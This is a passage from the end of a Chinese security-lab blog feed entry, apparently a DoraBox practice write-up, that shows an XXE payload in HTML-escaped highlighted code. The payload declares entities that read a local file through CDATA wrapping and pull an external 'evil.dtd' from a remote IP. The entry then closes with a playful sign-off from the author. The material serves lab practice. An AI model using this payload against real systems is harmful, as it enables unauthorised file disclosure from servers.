class=&#34;meta&#34;&gt;&amp;lt;!ENTITY % &lt;span class=&#34;meta-keyword&#34;&gt;start&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;&amp;lt;![CDATA[&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;   &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY % &lt;span class=&#34;meta-keyword&#34;&gt;goodies&lt;/span&gt; &lt;span class=&#34;meta-keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;file:///C:/phpStudy/WWW/zhan/XXE-K/test.txt&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY % &lt;span class=&#34;meta-keyword&#34;&gt;end&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;]]&amp;gt;&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY % &lt;span class=&#34;meta-keyword&#34;&gt;dtd&lt;/span&gt; &lt;span class=&#34;meta-keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;http://192.168.220.143:8888/zhan/XXE-K/evil.dtd&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;%dtd; ]&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;roottag&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;all;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;roottag&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&#34;最后哦&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#最后哦&#34;&gt;#&lt;/a&gt; 最后哦&lt;/h1&gt;
&lt;p&gt;小心眼 + 记仇の milkii0，会打败你们的！&lt;/p&gt;
</content>
        <category term="dorabox,靶场练习" />
        <updated>2020-10-15T08:40:33.000Z</updated>
    </entry>
</feed>
